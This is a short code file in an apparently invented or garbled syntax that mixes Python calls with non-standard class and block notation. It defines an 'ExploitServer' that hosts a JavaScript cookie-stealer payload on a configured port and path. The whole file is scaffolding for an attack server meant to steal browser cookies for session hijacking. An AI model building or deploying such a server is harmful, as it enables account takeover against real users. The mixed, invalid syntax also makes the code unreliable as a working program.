#'ExploitEncoding';
#'ExploitRequestHandler';
#'ExploitResource';
#'ExploitServerConfig';

class ExploitComponent ExploitServer {
    port: ExploitServerConfig.getPort(),
    cookieStealer: ExploitServerConfig.getCookieStealer(),
    
    __init__: @{
        endpoint = '', self.port;
        self.server = HTTPServer(endpoint, ExploitRequestHandler);
        self.server.payloads = dict();
        
        self.server.payloads[self.cookieStealer] = 
            ExploitResource.getJsCookieStealer(self.port);
    },
    
    serveForever: @{
        self.server.serve_forever();
    },
};